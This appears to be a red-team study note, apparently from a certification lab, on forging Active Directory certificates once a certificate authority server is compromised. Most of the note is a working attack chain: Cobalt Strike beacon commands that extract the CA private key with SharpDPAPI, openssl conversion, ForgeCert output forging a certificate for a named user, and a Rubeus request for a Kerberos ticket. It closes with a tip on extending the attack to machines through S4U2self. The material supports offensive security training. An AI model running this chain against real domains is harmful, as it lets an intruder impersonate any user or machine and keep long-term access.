
[[Active Directory Certificate Services]] are usually installed/managed on separate servers than DC's. Lower priv accounts usually have access to these more often than to the DC's.

Gaining local admin access to a CA allows an attacker to extract the CA private key, which can be used to sign a forged certificate (think of this like the krbtgt hash being able to sign a forged TGT).

The default validity period for a CA private key is 5 years.

#### 🖊️ exploit via Cobalt Strike

1) If you have an active beacon on a CA server, you can extract private keys using [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)

```
beacon> run hostname
dc-2

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine
```

![[sub-ca-key.png]]
2) Save the private key and certificate to a `.pem` file and convert it to a `.pfx` with openssl.

```
ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out sub-ca.pfx
Enter Export Password: pass123
Verifying - Enter Export Password: pass123
```

3) Then, build the forged certificate with [ForgeCert](https://github.com/GhostPack/ForgeCert).

```
PS C:\Users\Attacker> C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "nlamb@cyberbotic.io" --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123

CA Certificate Information:
  Subject:        CN=sub-ca, DC=dev, DC=cyberbotic, DC=io
  Issuer:         CN=ca, DC=cyberbotic, DC=io
  Start Date:     8/15/2022 4:06:13 PM
  End Date:       8/15/2024 4:16:13 PM
  Thumbprint:     697B1C2CD65B2ADC80C3D0CE83A6FB889B0CA08E
  Serial:         13000000046EF818036CF8C99F000000000004

Forged Certificate Information:
  Subject:        CN=User
  SubjectAltName: nlamb@cyberbotic.io
  Issuer:         CN=sub-ca, DC=dev, DC=cyberbotic, DC=io
  Start Date:     10/5/2022 1:24:23 PM
  End Date:       10/5/2023 1:24:23 PM
  Thumbprint:     0CF404F5D1534854BA5EDEC5953ED7B7BE96C3A8
  Serial:         00978D5E506AE605589E43F21D17E56671

Done. Saved forged certificate to .\Desktop\fake.pfx with the password 'pass123'
```

4) Even though you can specify any SubjectAltName, the user does need to be present in AD.  We can now use Rubeus to request a legitimate TGT with this forged certificate.

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate:MIACAQ[...snip...]IEAAAA /password:pass123 /nowrap`

 ⚠ We're not limited to forging user certificates; we can do the same for machines.  Combine this with the S4U2self trick to gain access to any machine or service in the domain.




### Properties
---
📆 created   {{25-02-2024}} 15:58
🏷️ tags: #redteam #crto 

---

